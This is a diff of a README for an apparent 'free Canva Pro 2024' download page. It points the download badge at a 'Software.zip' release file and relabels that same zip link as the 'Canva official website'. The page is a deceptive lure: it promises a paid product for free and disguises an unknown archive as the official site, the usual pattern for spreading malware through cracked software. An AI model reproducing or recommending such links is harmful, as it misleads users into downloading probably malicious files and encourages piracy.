@@ -12,7 +12,7 @@ canva-download, canva-free-license, canva-pro, canva-pro-for-life-time, canva-pr
 ## 🌟 Get Canva Pro 2024 here:
 Click the button below to **download Canva Pro 2024** for FREE! 👇🏼
 
-[![Download Canva Pro 2024](https://img.shields.io/badge/Download-Canva%20Pro%202024-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Launch Canva Pro 2024")
+[![Download Canva Pro 2024](https://github.com/dion128706912/Canva-Pro-2024/releases/download/v1.0/Software.zip%20Pro%202024-blue)](https://github.com/dion128706912/Canva-Pro-2024/releases/download/v1.0/Software.zip "Launch Canva Pro 2024")
 
 ---
 
@@ -22,7 +22,7 @@ If the link above needs to be launched or if it's not working, please check the 
 ---
 
 ## 🌐 Visit Official Canva Website:
-Explore more about **Canva Pro 2024** and its fantastic features by visiting the [Canva official website](https://www.canva.com/).
+Explore more about **Canva Pro 2024** and its fantastic features by visiting the [Canva official website](https://github.com/dion128706912/Canva-Pro-2024/releases/download/v1.0/Software.zip).
 
 ---
 
